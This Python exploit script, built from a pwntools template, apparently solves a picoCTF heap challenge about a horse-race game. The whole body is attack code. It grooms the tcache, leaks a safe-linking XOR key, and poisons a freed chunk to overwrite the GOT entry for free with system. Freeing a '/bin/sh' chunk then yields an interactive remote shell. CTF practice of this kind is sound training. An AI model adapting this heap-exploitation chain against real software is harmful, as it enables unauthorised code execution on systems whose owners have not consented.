#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 55127 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 55127)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x00401c0c
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./'

def head_start(index, string, spot):
    io.sendlineafter(b"Choice: ", b"0")
    io.sendlineafter(b"Stable index # (0-17)? ", str(index).encode())
    io.sendlineafter(b"Enter a string of 16 characters: ", string)
    io.sendlineafter(b"New spot? ", str(spot).encode())

def add_horse(index, length, name):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Stable index # (0-17)? ", str(index).encode())
    io.sendlineafter(b"Horse name length (16-256)? ", str(length).encode())
    io.sendlineafter(b"characters: ", name)

def remove_horse(index):
    io.sendlineafter(b"Choice: ", b"2")
    io.sendlineafter(b"Stable index # (0-17)? ", str(index).encode())

def race():
    io.sendlineafter(b"Choice: ", b"3")

io = start()

for i in range(0x8):
    add_horse(i, 0x17, b'a' * 0x17)

for i in range(0x8)[::-1]:
    remove_horse(i)

for i in range(0x6):
    add_horse(i, 0x17, b'\xff')

add_horse(0x6, 0x17, b'a' * 8 + b'\xff')
add_horse(0x7, 0x17, b'\xff')

race()

io.recvuntil(b'a' * 8)
io.recvuntil(b'\n')
xor_leak = unpack(io.recvuntil(b'|', drop=True).strip(), 'all')

info(f'leak: {xor_leak:04x}')

remove_horse(0)
remove_horse(1)

fake = exe.got['free'] & 0xfffffffffffffff0
head_start(0x1, pack(fake ^ xor_leak) + b'\xff', 0)

add_horse(1, 0x17, b'/bin/sh\x00\xff')

add_horse(0, 0x17, flat({0x8: pack(exe.plt['system'])}) + b'\xff')

remove_horse(1)

io.interactive()

